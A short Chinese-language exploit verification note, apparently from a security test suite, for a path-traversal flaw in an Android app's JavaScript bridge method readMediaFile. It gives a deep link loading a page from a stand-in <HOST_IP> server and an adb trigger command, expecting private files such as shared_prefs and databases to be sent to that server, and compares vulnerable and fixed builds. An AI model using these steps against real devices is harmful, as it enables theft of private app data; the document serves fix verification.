# EXP: 1.2 Insecure JavaScript Bridge Implementation

## 漏洞概述

HomeAppBridge 的 `readMediaFile(fileName)` 方法直接使用 `File(baseDir, fileName)` 拼接路径，未对 `fileName` 做任何路径校验。攻击者通过路径穿梭（`../`）可读取 `snapshots` 目录以外的 App 私有文件。

## 触发方式

```
homeassistant://webview?url=http://<HOST_IP>:8000/exp/1.2
```

> `<HOST_IP>` 用 `server.py` 启动时显示的 IP 替换。MuMu 模拟器使用宿主机 LAN IP。

## 验证步骤

1. 清空旧数据: `rm -rf received/*`
2. 启动服务器: `python server.py`
3. ADB 触发:
   ```
   adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://<HOST_IP>:8000/exp/1.2"
   ```
4. 等待 3-5 秒后检查 `received/` 目录

## 预期结果

- **Vuln APK**: 路径穿梭成功，`received/` 中出现 `pathTraversal_0`, `pathTraversal_1`, `pathTraversal_2` 数据，包含 `shared_prefs/`、`databases/` 等目录下的私有文件内容
- **Fix APK**: `received/` 为空或只有空数据。路径穿梭被 `readMediaFile` 中的 `..` 检查和 `canonicalPath` 校验阻止，且 `HomeAppBridge` 仅对 `home-assistant.io` 域名注册
